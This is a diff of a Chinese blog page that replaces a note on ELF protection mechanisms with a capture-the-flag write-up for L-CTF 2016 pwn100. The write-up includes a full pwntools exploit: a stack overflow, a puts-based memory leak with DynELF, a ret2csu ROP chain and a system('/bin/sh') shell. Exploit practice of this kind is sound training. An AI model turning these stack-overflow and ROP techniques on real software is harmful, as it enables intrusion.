@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>ELF保护机制 | sixpar&#39;s blog</title>
-  <meta name="keywords" content=" 基础 ">
-  <meta name="description" content="ELF保护机制 | sixpar&#39;s blog">
+  <title>DynELF--L-CTF-2016-pwn100 | sixpar&#39;s blog</title>
+  <meta name="keywords" content=" ROP , DynELF ">
+  <meta name="description" content="DynELF--L-CTF-2016-pwn100 | sixpar&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="欢迎您的访问 想了解我？ 我只是某不知名的pwn手噢~">
 <meta property="og:type" content="website">
@@ -576,9 +576,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-ELF保护机制" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-DynELF-L-CTF-2016-pwn100" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">ELF保护机制</h1>
+        <h1 class="article-title">DynELF--L-CTF-2016-pwn100</h1>
     
     <div class="article-meta">
         
@@ -588,7 +588,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="笔记">笔记</a>
+            <a  data-rel="PWN题">PWN题</a>
             
         </span>
         
@@ -596,19 +596,21 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color3">基础</a>
+            <a class="color4">ROP</a>
+            
+            <a class="color2">DynELF</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-07-04 15:31:03'>2020-07-04 14:33</time>
+            Created At : <time class="date" title='Updated At: 2020-07-13 14:59:37'>2020-07-13 14:39</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:866</span>
+        <span>Count:1.1k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -638,7 +640,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#用checksec命令检查保护机制："><span class="toc-text">用checksec命令检查保护机制：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ELF保护机制介绍："><span class="toc-text">ELF保护机制介绍：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-RELRO-："><span class="toc-text">1.RELRO ：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Stack-："><span class="toc-text">2.Stack ：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-NX："><span class="toc-text">3.NX：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-PIE："><span class="toc-text">4.PIE：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-FORTIFY："><span class="toc-text">5.FORTIFY：</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#保护机制："><span class="toc-text">保护机制：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析程序："><span class="toc-text">分析程序：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用思路："><span class="toc-text">利用思路：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP："><span class="toc-text">EXP：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结："><span class="toc-text">总结：</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -654,27 +656,107 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="用checksec命令检查保护机制："><a href="#用checksec命令检查保护机制：" class="headerlink" title="用checksec命令检查保护机制："></a>用checksec命令检查保护机制：</h2><p>检查保护机制用 checksec 命令：</p>
-<blockquote>
-<p>checksec filename</p>
+        <blockquote>
+<p>本题接着上一篇，同样是关于DynELF利用的一道例题。只不过这一次使用的是puts作为输出函数。</p>
 </blockquote>
-<p>得到如下：</p>
-<blockquote>
-<ul>
-<li>Arch:     amd64-64-little</li>
-<li>RELRO:    Partial RELRO</li>
-<li>Stack:    Canary found</li>
-<li>NX:       NX enabled</li>
-<li>PIE:      No PIE (0x400000)</li>
-</ul>
+<h2 id="保护机制："><a href="#保护机制：" class="headerlink" title="保护机制："></a>保护机制：</h2><blockquote>
+<p>Arch:     amd64-64-little<br>RELRO:    Partial RELRO<br>Stack:    No canary found<br>NX:       NX enabled<br>PIE:      No PIE (0x400000)</p>
 </blockquote>
-<p>会得到elf运行平台和相关安全措施和保护机制。可见是一个64位ELF文件。字体是绿色表示该保护机制是开启状态。<br>如果单纯用gcc编译一个C源码不加任何参数的话，默认会开启所有的保护机制。详情请看笔记《gcc编译过程和保护机制》</p>
-<h2 id="ELF保护机制介绍："><a href="#ELF保护机制介绍：" class="headerlink" title="ELF保护机制介绍："></a>ELF保护机制介绍：</h2><h3 id="1-RELRO-："><a href="#1-RELRO-：" class="headerlink" title="1.RELRO ："></a>1.RELRO ：</h3><p>重定位只读。它能保护库函数的调用不受攻击者重定向的影响。<br>它有两种状态： Partial RELRO（黄色） 和 FULL RELRO（绿色）。FULL RELRO表示开启状态，则攻击者无法修改 got 表。</p>
-<h3 id="2-Stack-："><a href="#2-Stack-：" class="headerlink" title="2.Stack ："></a>2.Stack ：</h3><p>canary意为金丝雀， 如果栈中开启 Canary保护机制 （Canary found） ，就不能直接用溢出的方式来覆盖栈中的返回地址。而要通过改写指针与局部变量、leak canary 、overwrite cannary 的方法来绕过，详情请看笔记《绕过canary机制的几种方法总结》。<br>该保护机制的缺陷：仅保护了sip，未保护应用变量，覆写GOT绕过。</p>
-<h3 id="3-NX："><a href="#3-NX：" class="headerlink" title="3.NX："></a>3.NX：</h3><p>如果开启 NX enabled 保护，则栈中数据没有执行权限，栈和bss段就只有读写权限了。以前用的 call esp 或者 jmp esp的方法就不能用了。以及相关的shellcode也都不能使用了。 但可以用ROP的方式绕过拿到系统权限。如果程序很复杂或者使用静态编译的话，可以使用ROPgadget这个工具找到相关gadgets然后构造ROP利用链。</p>
-<h3 id="4-PIE："><a href="#4-PIE：" class="headerlink" title="4.PIE："></a>4.PIE：</h3><p>如果开启 PIE enabled 保护，则地址随机化（ASLR），每次运行时地址都会变化，然后IDA分析ELF文件显示给你的都是偏移地址。且只有把运行中的程序截断下来查看时才会得到具体的地址。所以我们就需要在不打扰程序运行的前提下令程序泄露出某个地址，然后根据函数之间的固定偏移，求出现在另一个函数的实际内存地址是多少。<br>若没有开启PIE机制的话，64位程序就显示的是 No PIE （0x400000），括号内的地址就是程序的基地址image_base。而32位程序则是 NO PIE(0x8048000)。</p>
-<p>当然也有应对PIE 地址随机化的方法：<br>摘自笔记《gdb调试》：gdb ./pwn 打开gdb调试 ， 然后 r 加载运行程序 ， 然后在另开一个终端输入 “ps -ef |grep pwn” 得到pwn程序的PID ，然后 “cat /proc/pid/maps” 查看内存信息，得到基址，一般是第一行的start地址，那么就得到了实际地址 = 基址+IDA的相对偏移。然后就可以在第一个终端正在运行的程序里对该地址下断点，进行后续操作。</p>
-<h3 id="5-FORTIFY："><a href="#5-FORTIFY：" class="headerlink" title="5.FORTIFY："></a>5.FORTIFY：</h3><p>有时候还会蹦出这么个保护机制。FORTIFY_SOURCE 机制对格式化字符串有两个限制：<br>(1)包含%n的格式化字符串不能位于程序内存中的可写地址；(2)当使用位置参数时，必须使用范围内的所有参数。<br>所以如果要使用 %7$x ，就必须要同时使用1,2,3,4,5,6 。FORTIFTY确定函数执行栈的大小，以避免缓冲区溢出攻击。</p>
+<h2 id="分析程序："><a href="#分析程序：" class="headerlink" title="分析程序："></a>分析程序：</h2><p>存在栈溢出漏洞。buf为0x40，而我们能输入0xc8 （200）个字节。并且这里有一个读取循环，当读取达到200字节时才会退出读取循环。</p>
+<p>程序没有libc，所以可以尝试使用DynELF手法，另外也没有system函数，没有/bin/sh。</p>
+<p>本题有puts函数和read函数，那么就选择puts函数作为我们的输出函数。<br>puts函数比较简便，只需要一个参数即可。但是puts函数输出的数据长度是不受控的，只要我们输出的信息中包含/x00截断符，输出就会终止，且会自动将“\n”追加到输出字符串的末尾，这是puts函数的缺点。它不像write函数一样输出的size有多少就输出多少。</p>
+<h2 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h2><blockquote>
+<p>1.利用DynELF模块dump整个libc，泄露system函数地址。<br>2.构造rop链，调用read函数往可写地址上写入”/bin/sh”<br>3.再次构造rop链调用system函数</p>
+</blockquote>
+<h2 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h2><pre><code class="python">#coding:utf-8
+from pwn import *
+import binascii
+elf = ELF(&#39;./pwn100&#39;)
+p = process(&#39;./pwn100&#39;)
+
+puts_plt=elf.symbols[&#39;puts&#39;]
+puts_got=elf.got[&#39;puts&#39;]
+read_plt=elf.symbols[&#39;read&#39;]
+read_got=elf.got[&#39;read&#39;]
+pop_6_addr=0x040075a  # pop rbx_rbp_r12_r13_r14_r15
+mov_addr=0x0400740   # 3个mov，令 rdx=r13, rsi=r14, edi=r15
+#main_addr=0x04006b8
+start_addr=0x0400550
+pop_rdi_addr=0x0400763
+
+#找到一块可写的地址：
+#Start              End                Perm  Name
+#0x00601000     0x00602000     rw-p  /home/kk/Desktop/black/GFSJ/pwn100/pwn100
+waddress=0x601000
+
+def leak(address):
+        count=0
+        data=&#39;&#39;
+        payload=&#39;a&#39;*(0x40+8)+p64(pop_rdi_addr)+p64(address)+p64(puts_plt)+p64(start_addr)
+        # puts只需要一个参数即可
+        payload=payload.ljust(200,&#39;B&#39;)  #填充到200,因为只有写满200字节才结束读取循环
+        p.send(payload)
+        print p.recvuntil(&#39;bye~\n&#39;) #一定要在puts前释放完输出 #这句不加会出错，显示recv错误，太快了？ 
+        #puts函数输出的数据长度是不受控的，
+        # 只要我们输出的信息中包含/x00截断符，输出就会终止，
+        # 且会自动将“\n”追加到输出字符串的末尾
+        up=&quot;&quot;
+        while True:
+                c=p.recv(numb=1,timeout=0.5)
+                count+=1
+                if up==&#39;\n&#39; and c==&quot;&quot;:   #找到泄漏信息的字符串特征
+                        data=data[:-1]
+                        data+=&quot;\x00&quot;
+                        break
+                else:
+                        data+=c
+                up=c
+        data=data[:4]
+        log.info(&quot;%#x +&gt; %s&quot; % (address,(data or &#39;&#39;).encode(&#39;hex&#39;)))
+        return data
+
+d=DynELF(leak,elf=ELF(&#39;./pwn100&#39;))
+sys_addr =d.lookup(&#39;__libc_system&#39;,&#39;libc&#39;)
+print &quot;sys_addr:&quot;, hex(sys_addr)
+payload1=&#39;a&#39;*(0x40+8)+p64(pop_6_addr)+p64(0)+p64(1)+p64(read_got)+p64(8)+p64(waddress)+p64(0)+p64(mov_addr)+&#39;\x00&#39;*56+p64(start_addr)
+#填充 7*0x8=56 个字节的&#39;\x00&#39;返回到start地址
+payload1=payload1.ljust(200,&quot;B&quot;) #填充到200,因为只有写满200字节才结束读取循环，下同
+p.send(payload1)
+print p.recvuntil(&#39;bye~\n&#39;)
+p.send(&quot;/bin/sh\x00&quot;)
+payload2=&#39;a&#39;*0x48+p64(pop_rdi_addr)+p64(waddress)+p64(sys_addr)+p64(start_addr)
+payload2=payload2.ljust(200,&quot;B&quot;)
+p.send(payload2)
+p.interactive()
+
+#关于ROP链，可以对照着以下程序片段进行理解：
+
+# .text:0000000000400740 loc_400740:                             ; CODE XREF: init+54↓j
+# .text:0000000000400740                 mov     rdx, r13
+# .text:0000000000400743                 mov     rsi, r14
+# .text:0000000000400746                 mov     edi, r15d
+# .text:0000000000400749                 call    qword ptr [r12+rbx*8]
+# .text:000000000040074D                 add     rbx, 1
+# .text:0000000000400751                 cmp     rbx, rbp
+# .text:0000000000400754                 jnz     short loc_400740
+# .text:0000000000400756
+# .text:0000000000400756 loc_400756:                             ; CODE XREF: init+36↑j
+# .text:0000000000400756                 add     rsp, 8
+# .text:000000000040075A                 pop     rbx
+# .text:000000000040075B                 pop     rbp
+# .text:000000000040075C                 pop     r12
+# .text:000000000040075E                 pop     r13
+# .text:0000000000400760                 pop     r14
+# .text:0000000000400762                 pop     r15
+# .text:0000000000400764                 retn
+
+#我对payload1的理解：前面6个pop把栈中数据弹出，传参，retn跳转到mov_addr，并执行完3个mov后，开始执行call qword ptr [read_got+0*8]，即call read_got ，调用read函数，把我们的binsh字符串读取到某可写地址上。
+#接着下一句由于 rbx=rbp，所以jnz语句失效，不跳转，继续往下执行。
+#又再次来到 0x400756 ，从这地方开始想要到达retn这儿，中间隔着有 7×0x8 =56个字节，故我们填充掉56字节。
+#retn地址填start_addr ，跳转。
+
+#payload2就很好理解了，rdi传递system函数的一个参数即可，返回地址随便。</code></pre>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>DynELF使用puts作为输出函数时需要注意被截断的问题。<br>以及ROP链构造问题，要对程序片段进行分析和理解。</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论嗷。 </span>
